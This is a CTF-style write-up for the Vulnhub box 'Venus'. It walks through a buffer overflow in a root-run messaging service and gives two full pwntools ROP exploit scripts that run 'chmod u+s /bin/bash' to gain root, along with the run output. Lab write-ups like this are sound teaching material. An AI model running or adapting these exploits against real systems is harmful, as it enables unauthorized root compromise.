# Vulnhub

## The Planets: Venus (root flag)

> Date release: 3 Jun 2021  
> Author: SirFlash  
> Series: The Planets  
> URL: [https://www.vulnhub.com/entry/the-planets-venus,705/](https://www.vulnhub.com/entry/the-planets-venus,705/)  
>  
> Difficulty: <s>Medium</s> Easy (read until the end to understand why I think this is easy)
>
> Venus is a medium box requiring more knowledge than the previous box, "Mercury", in this series. There are two flags on the box: a user and root flag which include an md5 hash.


Tags: _pwn_ _x86-64_ _bof_ _ret2csu_ _rop_ _rcx_

## Summary

AB2 discorded me two files [venus_messaging](venus_messaging) and [libc.so.6](libc.so.6), and asked if I could help with this vulnbox.  I took a quick look at the binary in Ghidra and told AB2 it'd take me about an hour.

> I'd never heard of these Vulnhub vulnboxes before--AB2 send me the link above in the description.
> 
> I didn't boot up the vulnbox until _after_ I had an exploit tested locally.  Had I checked out the vulnbox first this 60 min solve would have been a 5 min solve.  I'll be covering the 60 min solve first and the 5 min solve at the end.

`venus_messaging` is a basic buffer overflow challenge, however a bit tricker since you're not dealing with stdin/stdout, but send/recv.  However, the principles are the same, leak libc, score a second pass, call `system`.

AB2 pointed out `venus_messaging` was running as root and also provided me with his [writeup for the user flag](https://github.com/ab2pentest/ctfwriteups/blob/main/VulnHub/Venus.md).  Since AB2 already had a remote shell, my part would be easier since I just needed to run a single `chmod u+s /bin/bash` command to enable any with a remote shell to get root access.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Almost no protection.  Partial RELRO = GOT overwrite, No canary = Easy BOF/ROP, No Pie = Easy ROP.

> It's even worse, the OS has ASLR disabled, but I didn't know this until after I completed the PoC locally.  The first exploit below will be with ASLR enabled.

### Decompile with Ghidra

```c
bool recv_message(int param_1)
{
  int iVar1;
  ssize_t sVar2;
  long lVar3;
  undefined8 *puVar4;
  undefined8 local_418;
  undefined8 local_410;
  undefined8 local_408 [127];
  int local_c;
  
  local_418 = 0;
  local_410 = 0;
  puVar4 = local_408;
  for (lVar3 = 0x7e; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  sVar2 = recv(param_1,&local_418,0x800,0);
  iVar1 = (int)sVar2;
  if (0 < iVar1) {
    local_c = iVar1;
    *(undefined *)((long)&local_418 + (long)(iVar1 + -1)) = 0;
    puts("Message received:");
    puts((char *)&local_418);
    send(param_1,"Message sent to the Venus space station.\nEnter message:\n",0x38,0);
    puts("Message acknowledgement sent.");
  }
  return 0 < iVar1;
}
```

`recv(param_1,&local_418,0x800,0);` will receive `0x800` bytes into a buffer that is `0x418` (`local_418`) bytes from the return address on the stack.  That, coupled with with no PIE and no canary, makes for some easy pwning.

But...

This isn't your simple _leak libc with puts_ since stdin/stdout/stderr is not available, instead we have to use `send` and `recv`, functions that take four arguments.  One and two function arguments with x86\_64 is pretty easy, you can find `pop rdi` and `pop rsi` gadgets in just about any x86\_64 binary, and with _No PIE_, well then, we can just use without a base process leak.  For the 3rd argument we'll need to use _ret2csu_ to set `rdx`.

_But what about the 4th parameter (`rcx`)?_

This is where I burned most of my time.  `ropper` and poring over the disassembly reviled no easy `rcx` gadgets.  My first thought was to get it for free since `send` before the `return` at the end sets `rcx` to zero, however after `send` returns, `rcx` is no longer zero.

If `rcx` was being set internally by `send`, could other functions in the GOT (that I get to call for free) also set `rcx` or better yet, reset `rcx` (zero)?

Yes.  After setting a breakpoint at `main` and just going through line by line, function by function, `printf` surfaced as a winner.  On return, `printf` resets `rcx` to zero.  _`printf` FTW!_

We have all the bits we need. 


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./venus_messaging')

if args.REMOTE:
    #p = remote('172.19.2.239',9080)
    #port blocked? workaround: ssh -L 9080:localhost:9080 magellan@172.19.2.239
    p = remote('localhost',9080)
    libc = ELF('./libc.so.6')
else:
    p = remote('localhost',9080)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

command = b'chmod u+s /bin/bash'
fd = 0x4 # may need BF

p.sendlineafter(b'password:', b'loveandbeauty')
```

Above is just the standard pwntools header for remote and local test/dev.

When I tested with the vulnbox I could not access port `9080` (see `main` in Ghidra for the port number) outside of the vulnbox, `netstat` indicated it was listening on all interfaces, but I was too lazy to troubleshoot it, so just used ssh port forwarding.

The `command` is the remote command we want to run as root.  Above is what I used to setuid root `/bin/bash`.

`fd` is the file descriptor returned from `accept` (see `main` in Ghidra).  It was consistently `0x4` when testing locally (and remotely), so I hardcoded it.  With many of these CTF-type of challenges the file descriptors are constant; `0`, `1`, `2` are usually setup for stdin/stdout/stderr, so the next that will be assigned will be `3`, and it is usually `3`, but in this case it was `4`--just keep incrementing until it works for you.  And if it does change, well then, you either need to get lucky or put in the work to leak the file descriptor as well.

> Looks like `3` was for the socket:
> 
> ```
> lrwx------ 1 root root 64 Jul 23 21:33 0 -> /dev/pts/1
> lrwx------ 1 root root 64 Jul 23 21:33 1 -> /dev/pts/1
> lrwx------ 1 root root 64 Jul 23 21:33 2 -> /dev/pts/1
> lrwx------ 1 root root 64 Jul 23 21:33 3 -> 'socket:[2990878]'
> ```

Lastly in this block, we answer the password prompt--the password is in `main`.


```python
'''
  4015c0:       4c 89 f2                mov    rdx,r14
  4015c3:       4c 89 ee                mov    rsi,r13
  4015c6:       44 89 e7                mov    edi,r12d
  4015c9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4015cd:       48 83 c3 01             add    rbx,0x1
  4015d1:       48 39 dd                cmp    rbp,rbx
  4015d4:       75 ea                   jne    4015c0 <__libc_csu_init+0x40>
  4015d6:       48 83 c4 08             add    rsp,0x8
  4015da:       5b                      pop    rbx
  4015db:       5d                      pop    rbp
  4015dc:       41 5c                   pop    r12
  4015de:       41 5d                   pop    r13
  4015e0:       41 5e                   pop    r14
  4015e2:       41 5f                   pop    r15
  4015e4:       c3                      ret
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x4015da
set_rdx_rsi_rdi_call_r15 = 0x4015c0
pop_rdi = next(binary.search(asm('pop rdi; ret')))
```

Above is the relevant code we need from `__libc_csu_init` for _ret2csu_.  This will make it easy to call GOT functions that require at least three parameters.

We'll need `pop_rdi` as well to call `printf` for the reset of `rcx`, and later for the `system` call.


```python
payload  = b''
payload += 0x418 * b'A'

# reset rcx with printf
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(binary.plt.printf)

# leak libc via send
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)                   # rbx
payload += p64(1)                   # rbp to get pass check
payload += p64(fd)                  # r12 -> rdi, fd guess
payload += p64(binary.got.puts)     # r13 -> rsi, get the address of puts to leak
payload += p64(6)                   # r14 -> rdx, just need 6 bytes
payload += p64(binary.got.send)     # r15 pointer to function to call
payload += p64(set_rdx_rsi_rdi_call_r15)
# eat ret2csu pops
payload += p64(0) * 7

# reset rcx with printf
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(binary.plt.printf)

# recv into bss our RCE shell command
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)                   # rbx
payload += p64(1)                   # rbp to get pass check
payload += p64(fd)                  # r12 -> rdi, fd guess
payload += p64(binary.bss())        # r13 -> rsi, buffer to recv to
payload += p64(len(command))        # r14 -> rdx, len for recv
payload += p64(binary.got.recv)     # r15 pointer to function to call
payload += p64(set_rdx_rsi_rdi_call_r15)
# eat ret2csu pops
payload += p64(0) * 7

# back to recv_message for a 2nd pass
payload += p64(pop_rdi)
payload += p64(fd)
payload += p64(binary.sym.recv_message)
```

Above is our first payload, from the top down, this will pad out to `0x418` (see Analysis section) and place our ROP chain at the return address in the stack.

Next, using `printf` we'll reset `rcx` to zero; after that we'll use _ret2csu_ to set the other three parameters and then call `send` from the GOT to leak the address of `puts` (also from the GOT).

At this point we'll have a libc leak and could proceed with the 2nd pass and get everything else we need from libc, however, I'm lazy, and the buffer is plenty large enough that I just cut/pasted the previous and modified it--if space constrained I may have had to do something different.

`rcx` will no longer be zero, so we'll need to reset again.  The `printf` block is a ROP gadget short to keep the [stack aligned](http://blog.binpang.me/2019/07/12/stack-alignment/).  Fixing can usually be done by adding or removing a `ret` gadget (`pop_rdi+1` is a `ret` gadget).

Following the second `printf` `rcx` hack is another _ret2csu_ block, but this calls `recv` to write our `system` command to the BSS--it's common to use the BSS segment as a small scratch pad.

Finally we `pop` the FD (0x4) into `rdi` so we can call `recv_message` for a second pass.

At this point all we've done is login and create a ROP chain, nothing has been executed.


```python
# catch and send stuff to ropchain
p.sendlineafter(b'processed:\n',payload)
p.recvline()
p.recvline()
_ = p.recv(6)
libc.address = u64(_ + b'\0\0') - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
p.send(command)
```

The above block will launch our attack, then ignore the first two lines of text:

```python
send(param_1,"Message sent to the Venus space station.\nEnter message:\n",0x38,0);
```

Now, our ROP chain starts to execute, first it will leak the libc address of `puts`, which we can use to compute the base of libc, then we send the `command` for the waiting `recv` function.


```python
# 2nd pass payload to call system
payload  = b''
payload += 0x418 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(libc.sym.system)

p.sendline(payload)
p.stream()
```

At this point we're at the start of `recv_message` again, however this time we know where libc is and we've uploaded our command into the BSS segment.  All that is left to do is `pop` that location into `rdi` and call `system` to execute our command.


### Run it

First, `ssh -L 9080:localhost:9080 magellan@your_vuln_vm`, then from a second terminal:

```bash
# ./exploit.py REMOTE=1
[*] '/mnt/hgfs/defcon.wd/datajerk/misc/venus_messaging/venus_messaging'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to localhost on port 9080: Done
[*] '/mnt/hgfs/defcon.wd/datajerk/misc/venus_messaging/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7ffff7dee000
Message sent to the Venus space station.
Enter message:
[*] Closed connection to localhost port 9080
```


### Check from vulnbox VM and get the flag

```
[magellan@venus ~]$ /bin/bash -p
bash-5.1# cd /root
bash-5.1# ls -l
total 8
-rw-------. 1 root root  625 May 19 17:45 anaconda-ks.cfg
-rw-------. 1 root root 1225 May 21 11:41 root_flag.txt
bash-5.1# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Congratulations on completing Venus!!!
If you have any feedback please contact me at SirFlash@protonmail.com
```


## Fuck ... me ...

Did you see it?  Did you notice the vulnbox libc address?

```
0x7ffff7dee000
```

Yeah, that does NOT look like ASLR is enabled in this OS.  You can check this a couple of ways _only from the vulnbox VM_:

```
bash-5.1# ldd /usr/bin/venus_messaging
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
bash-5.1# ldd /usr/bin/venus_messaging
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
```

Notice how the address for `libc.so.6` isn't changing?

Second check:

```
bash-5.1# cat /proc/sys/kernel/randomize_va_space
0
```

> **RANT: Who the fuck disables ASLR in the OS?  This puts this challenge back to before 2005.  This is why I did the strike through and rated this _easy_.**

> Ok, ok, I get it, this probably enables some to learn, and perhaps in some cases like IoT, it is relevant, however in almost all CTFs, all binary challenges have ASLR enabled in the OS.

With no ASLR, we do not need to leak libc. and I didn't need to spend most of an hour looking for ways to reset `rcx`--I get all that for free from libc.

### 5-min Exploit
        
```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./venus_messaging')

if args.REMOTE:
    #p = remote('172.19.2.239',9080)
    #port blocked? workaround: ssh -L 9080:localhost:9080 magellan@172.19.2.239
    p = remote('localhost',9080)
    libc = ELF('./libc.so.6')
    # lame no ASLR
    '''
    # ldd /usr/bin/venus_messaging
    linux-vdso.so.1 (0x00007ffff7fc9000)
    libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
    '''
    libc.address = 0x00007ffff7dee000
else:
    p = remote('localhost',9080)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = 0x00007ffff7dc0000

fd = 0x4
command = b'chmod u+s /bin/bash'

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi = next(libc.search(asm('pop rsi; ret')))
pop_rdx_rcx_rbx = next(libc.search(asm('pop rdx; pop rcx; pop rbx; ret')))

payload  = b''
payload += 0x418 * b'A'
payload += p64(pop_rdi)
payload += p64(fd)
payload += p64(pop_rsi)
payload += p64(binary.bss())
payload += p64(pop_rdx_rcx_rbx)
payload += p64(len(command))
payload += p64(0)
payload += p64(0)
payload += p64(binary.plt.recv)
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(libc.sym.system)

p.sendlineafter(b'password:', b'loveandbeauty')
p.sendlineafter(b'processed:\n',payload)
sleep(0.1)
p.send(command)
p.stream()
```        

The header is basically the same, but I added the hardcoded libc address locations.

From libc we have all the gadgets we need to set the four registers--something you can do if you have both the version of libc (included), and the location (apparently included, but nobody told me :-).

This single pass ROP chain is pretty straight forward:

1. `pop` in the four parameter for `recv`
2. call `recv` to receive our `command` into the BSS
3. `pop` in the location of the BSS into `rdi`
4. call `system`

The `sleep` is required so that `recv` will stop reading and not consume our `command` as part of the initial `recv` (the one called from `recv_message`, not our ROP chain `recv`).  The other option would have been to pad out the payload to the full `0x800` bytes (this is usually the better option, but I was lazy).
